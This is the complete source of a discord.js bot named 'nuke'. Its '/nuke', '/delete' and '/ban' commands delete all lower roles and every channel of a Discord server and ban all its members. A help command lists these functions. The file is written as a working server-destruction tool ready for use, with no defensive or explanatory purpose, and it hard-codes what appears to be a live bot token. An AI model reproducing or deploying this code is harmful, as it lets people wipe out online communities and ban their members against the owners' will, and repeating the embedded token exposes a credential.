const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by droy.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `lock dev-droy` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("/" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("roy"));
}
if(msg.content.toLowerCase().startsWith("/" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("/" + "ban")){
    msg.guild.members.tap(member => member.ban("roy"));
}
if(msg.content.toLowerCase().startsWith("/" + "help")){
    msg.author.send({
        embed: {
            color: 1,
            author: { name: "made by roys aka droy" },
            description: "/nuke to delete and ban...../ban to ban members...../delete to delete channels\ droy :)"
        }
    })
}
});

nuke.login("Nzc2MTM4OTA4NTMwMTE0NTkw.X6whrw.3phwD98Z-HonayR7A7c4WHIahLI");